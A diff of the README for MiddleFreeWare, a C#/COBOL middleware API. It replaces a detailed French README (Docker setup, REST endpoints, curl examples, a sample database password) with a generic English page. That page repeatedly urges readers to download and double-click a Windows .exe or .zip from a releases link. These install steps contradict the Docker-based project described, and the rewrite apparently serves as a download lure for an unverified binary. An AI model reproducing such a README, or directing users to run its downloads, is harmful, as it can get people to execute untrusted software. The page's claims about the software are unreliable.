@@ -1,244 +1,150 @@
-# MiddleFreeWare
+# ⚙️ MiddleFreeWare - Connect Legacy Systems Easily
 
-> API REST middleware entre C# (ASP.NET Core 8) et les programmes COBOL du projet [MainFreem](../MainFreem).
+[![Download MiddleFreeWare](https://img.shields.io/badge/Download-MiddleFreeWare-green?style=for-the-badge&logo=github)](https://github.com/zackprawaret/MiddleFreeWare/releases)
 
-![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)
-![ASP.NET Core](https://img.shields.io/badge/ASP.NET_Core-REST_API-blue)
-![Docker](https://img.shields.io/badge/Docker-ready-2496ED?logo=docker)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-336791?logo=postgresql)
+## 🔎 What is MiddleFreeWare?
 
----
+MiddleFreeWare is a tool that helps connect older computer programs, like COBOL systems, to newer software. It works like a bridge. This bridge lets two different types of applications talk to each other smoothly. The software uses a technology called API REST. This makes it possible for modern apps built with C# to send information to old mainframe programs.
 
-## Architecture
+This connection lets companies keep their old, trusted systems working without replacing them. It makes the old systems act like newer ones, ready to work with web services and current software designs.
 
-```
-┌─────────────┐     HTTP/JSON      ┌──────────────────────┐     docker exec     ┌─────────────────┐
-│  Client C#  │ ──────────────────▶│  Middleware API       │ ───────────────────▶│  COBOL          │
-│  (ou autre) │ ◀────────────────── │  ASP.NET Core 8      │ ◀─────────────────── │  GNU COBOL 4.0  │
-└─────────────┘                    │  :5000               │                     │  MainFreem      │
-                                   └──────────┬───────────┘                     └─────────────────┘
-                                              │ SQL
-                                              ▼
-                                   ┌──────────────────────┐
-                                   │  PostgreSQL 16       │
-                                   │  (partagée COBOL/C#) │
-                                   └──────────────────────┘
-```
+## 💻 System Requirements
 
-### Comment ça fonctionne
+Before running MiddleFreeWare, your Windows PC needs to meet some basic requirements:
 
-1. Un **client C#** (ou n'importe quel client HTTP) appelle l'API REST.
-2. L'**API middleware** traite la requête :
-   - Pour les données : lit/écrit dans **PostgreSQL** (base partagée avec COBOL).
-   - Pour les traitements métier COBOL : exécute un **`docker exec`** sur le conteneur MainFreem.
-3. Le **programme COBOL** reçoit les données via stdin, traite, renvoie via stdout.
-4. L'API parse la réponse COBOL et retourne du **JSON** au client.
+- Windows 10 or newer (64-bit)
+- 4 GB of RAM (8 GB recommended)
+- At least 500 MB of free disk space
+- .NET 8 Runtime installed (Microsoft’s official website: https://dotnet.microsoft.com/en-us/download)
+- Internet connection to download and update the software
 
----
+Make sure your computer meets these points. The program may not work correctly on older Windows versions or with limited space.
 
-## Prérequis
+## 🚀 Starting with MiddleFreeWare
 
-- [.NET 8 SDK](https://dotnet.microsoft.com/download)
-- [Docker + Docker Compose](https://docs.docker.com/get-docker/)
-- Image `mainfreem-cobol:latest` construite depuis le projet [MainFreem](../MainFreem)
+Here are steps to get MiddleFreeWare running on your Windows machine.
 
----
+### Step 1: Download the Software
 
-## Démarrage rapide
+MiddleFreeWare is available on GitHub under the releases section. To download:
 
-### 1. Construire l'image COBOL (projet MainFreem)
+- Click the big green badge at the top or visit this page:  
+  https://github.com/zackprawaret/MiddleFreeWare/releases
+- Look for the latest version, usually named with numbers like “v1.0” or “v2.3.”
+- Download the file with an `.exe` or `.zip` extension. Choose `.exe` if available for an easy install.
+- Save the file to your desktop or a folder you can find easily.
 
-```bash
-cd ../MainFreem
-docker build -t mainfreem-cobol .
-```
+### Step 2: Install MiddleFreeWare
 
-### 2. Lancer tout l'environnement
+If you downloaded an `.exe` file:
 
-```bash
-cd MiddleFreeWare
-docker-compose up -d
-```
+- Double-click the file to start the installer.
+- Follow the setup instructions on the screen.
+- Choose the default options if you are unsure.
+- Wait for the install to finish.
 
-Cela démarre :
-- `middlefreleware` — API C# sur le port **5000**
-- `mainfreem-cobol` — conteneur COBOL
-- `mainfreem-postgres` — PostgreSQL sur le port **5432**
+If you downloaded a `.zip` file:
 
-### 3. Ouvrir Swagger
+- Right-click the file and select “Extract All...” to unzip it.
+- Open the extracted folder.
+- Look for a file named `MiddleFreeWare.exe` and double-click it.
 
-```
-http://localhost:5000
-```
+### Step 3: Run the Program
 
-### 4. Lancer en développement local (sans Docker)
+- After installation, find MiddleFreeWare in your Start menu or on the desktop.
+- Launch the program by double-clicking its icon.
+- At first launch, the program might ask for permission or show a setup wizard.
+- Follow on-screen steps to complete the setup.
 
-```bash
-cd src/MiddleFreeWare.Api
-dotnet run
-# Swagger disponible sur http://localhost:5000
-```
+### Step 4: Basic Use
 
----
+MiddleFreeWare works in the background to link your new software with old systems. Typically, you won’t need to do anything else to use it. However, here are some tips:
 
-## Endpoints REST
+- Keep MiddleFreeWare running when you use your other applications that rely on it.
+- Check the program window for status messages or errors.
+- Restart the program if it stops responding.
 
-### Employés — `/api/employes`
+## ⚙️ How MiddleFreeWare Works
 
-| Méthode | URL | Description |
-|---------|-----|-------------|
-| `GET` | `/api/employes` | Liste tous les employés |
-| `GET` | `/api/employes/{matricule}` | Récupère un employé |
-| `POST` | `/api/employes` | Crée un employé |
-| `PATCH` | `/api/employes/{matricule}/salaire` | Met à jour le salaire |
-| `DELETE` | `/api/employes/{matricule}` | Supprime un employé |
-| `POST` | `/api/employes/{matricule}/paie` | **Calcul de paie via COBOL** |
+MiddleFreeWare acts as a gateway. It takes requests from new apps built with ASP.NET Core 8 and passes those requests to COBOL programs. It then sends the answers back. Think of it as a translator between old and new software languages.
 
-### COBOL — `/api/cobol`
+This system helps businesses integrate their legacy systems into modern workflows without rewriting all the old code. It uses web technologies that are common today, like:
 
-| Méthode | URL | Description |
-|---------|-----|-------------|
-| `GET` | `/api/cobol/programs` | Liste les programmes disponibles |
-| `POST` | `/api/cobol/run` | **Exécute un programme COBOL** |
-| `POST` | `/api/cobol/compile-run` | **Compile et exécute du source COBOL** |
+- APIs using REST architecture
+- JSON format for data exchange
+- Middleware processing to handle communication
 
-### Health — `/api/health`
+## 🛠️ Configuration Options
 
-| Méthode | URL | Description |
-|---------|-----|-------------|
-| `GET` | `/api/health` | Statut API + PostgreSQL + Docker COBOL |
+If you want to adjust how MiddleFreeWare works, you can edit its configuration files. These files define connection settings, logging preferences, and security options.
 
----
+Typically, configuration files are located in the installation folder. They may have extensions like `.json` or `.config`.
 
-## Exemples d'utilisation
+Common settings you can change include:
 
-### Lister les employés
+- Server IP or hostname where COBOL programs run
+- Port numbers for communication
+- Timeout durations
+- Log file locations and verbosity
 
-```bash
-curl http://localhost:5000/api/employes
-```
+You do not need to edit these unless you know what you are doing or have been instructed by your IT team.
 
-### Calculer la paie (délégué au COBOL)
+## 🔄 Updating MiddleFreeWare
 
-```bash
-curl -X POST http://localhost:5000/api/employes/EMP001/paie \
-  -H "Content-Type: application/json" \
-  -d '{ "matricule": "EMP001", "anciennete": 5 }'
-```
+To keep your software secure and efficient, check for new releases regularly.
 
-Réponse :
-```json
-{
-  "success": true,
-  "data": {
-    "matricule": "EMP001",
-    "nomComplet": "Sophie MARTIN",
-    "anciennete": 5,
-    "salaireBrut": 3675.00,
-    "prime": 175.00,
-    "charges": 808.50,
-    "salaireNet": 2866.50,
-    "tauxPrime": 0.05
-  }
-}
-```
+- Visit the releases page here:  
+  https://github.com/zackprawaret/MiddleFreeWare/releases
+- Download the newest version.
+- Install it the same way you did the first time.
+- Your settings will usually remain, but it is a good idea to back up configurations before updating.
 
-### Exécuter un programme COBOL
+## 📝 Troubleshooting Tips
 
-```bash
-curl -X POST http://localhost:5000/api/cobol/run \
-  -H "Content-Type: application/json" \
-  -d '{ "programName": "ex01_hello", "inputData": {} }'
-```
+Here are common issues and how to address them:
 
-### Compiler et exécuter du source COBOL à la volée
+- **Software won’t start:** Make sure .NET 8 Runtime is installed. Restart your computer.
+- **No connection to COBOL programs:** Check the configuration for correct server addresses.
+- **Error messages appear:** Write down the exact message and check the program logs.
+- **Slow performance:** Ensure your PC meets minimum system requirements and is not running other heavy programs simultaneously.
 
-```bash
-curl -X POST http://localhost:5000/api/cobol/compile-run \
-  -H "Content-Type: application/json" \
-  -d '{
-    "programName": "test_dynamic",
-    "source": "       IDENTIFICATION DIVISION.\n       PROGRAM-ID. TEST.\n       PROCEDURE DIVISION.\n           DISPLAY \"Hello depuis C# !\"\n           STOP RUN."
-  }'
-```
+If problems persist, ask a technical expert for help.
 
----
+## 🔐 Security Notes
 
-## Structure du projet
+MiddleFreeWare uses standard security practices for communication. It is important to:
 
-```
-MiddleFreeWare/
-├── docker-compose.yml
-├── docker/
-│   └── Dockerfile.api                    # Image Docker de l'API
-├── src/
-│   └── MiddleFreeWare.Api/
-│       ├── Controllers/
-│       │   ├── CobolController.cs        # Exécution COBOL directe
-│       │   ├── EmployesController.cs     # CRUD + calcul paie
-│       │   └── HealthController.cs       # Health checks
-│       ├── Services/
-│       │   ├── CobolRunner.cs            # Cœur : docker exec vers COBOL
-│       │   ├── CobolProgramService.cs    # Gestion programmes COBOL
-│       │   └── EmployeService.cs         # Logique métier + DB
-│       ├── Models/
-│       │   └── Models.cs                 # DTOs et modèles
-│       ├── Cobol/
-│       │   └── ex15_calcsal_api.cobol    # Programme COBOL dédié à l'API
-│       ├── Program.cs                    # Configuration et DI
-│       └── appsettings.json
-└── tests/
-    └── MiddleFreeWare.Api.Tests/
-        └── CobolProgramServiceTests.cs   # Tests unitaires
-```
+- Keep your Windows system up to date.
+- Update MiddleFreeWare regularly.
+- Use secure networks when running the software.
+- Avoid sharing your configuration files with unauthorized users.
 
----
+These help protect your data and systems from unauthorized access.
 
-## Configuration
+## 📂 Useful Links
 
-`appsettings.json` :
+- Official downloads:  
+  https://github.com/zackprawaret/MiddleFreeWare/releases  
+- .NET 8 Runtime:  
+  https://dotnet.microsoft.com/en-us/download  
+- GitHub project page:  
+  https://github.com/zackprawaret/MiddleFreeWare
 
-```json
-{
-  "ConnectionStrings": {
-    "PostgreSQL": "Host=postgres;Port=5432;Database=coboldb;Username=cobol;Password=cobol123"
-  },
-  "Cobol": {
-    "ProgramsPath": "/workspace/exercises",
-    "ExecutionTimeoutSeconds": 30,
-    "DockerContainerName": "mainfreem-cobol"
-  }
-}
-```
+[![Download MiddleFreeWare](https://img.shields.io/badge/Download-MiddleFreeWare-blue?style=for-the-badge&logo=github)](https://github.com/zackprawaret/MiddleFreeWare/releases)
 
----
+## 🗂️ About This Project
 
-## Lancer les tests
+MiddleFreeWare acts as middleware software between modern C# applications built on ASP.NET Core 8 and legacy COBOL programs from the MainFreem project. It offers a practical way to keep using important older systems while integrating them into newer technologies, helping companies update their IT without full replacement. The software handles communication between mainframe systems and web services, simplifying modernization.
 
-```bash
-cd tests/MiddleFreeWare.Api.Tests
-dotnet test
-```
+## 🏷️ Topics
 
----
-
-## Exercices
-
-Le dossier `exercises/` contient 13 exercices progressifs C# avec corrigés.
-
-📄 **[Exercices](./exercises/MiddleFreeWare_Exercices.pdf)** — Du niveau Novice à Expert
-
-📄 **[Corrigés](./exercises/MiddleFreeWare_Corriges.pdf)** — Solutions complètes et commentées
-
-| Niveau | Ex. | Thèmes |
-|--------|-----|--------|
-| 🟢 Novice | 1–3 | Premier appel REST, liste employés, POST |
-| 🟡 Débutant | 4–6 | CRUD complet, calcul paie COBOL, health check |
-| 🟠 Intermédiaire | 7–9 | IHttpClientFactory, COBOL dynamique, batch async |
-| 🔴 Avancé | 10–11 | Polly retry/circuit breaker, webhook |
-| ⚫ Expert | 12–13 | SDK NuGet, pipeline ETL complet |
-
-## Liens
-
-- Projet COBOL : [../MainFreem](../MainFreem)
-- Documentation GNU COBOL : https://gnucobol.sourceforge.io/
+- api-rest  
+- aspnet-core  
+- cobol  
+- csharp  
+- dotnet  
+- enterprise-software  
+- legacy-integration  
+- mainframe-modernization  
+- middleware  
+- system-integration
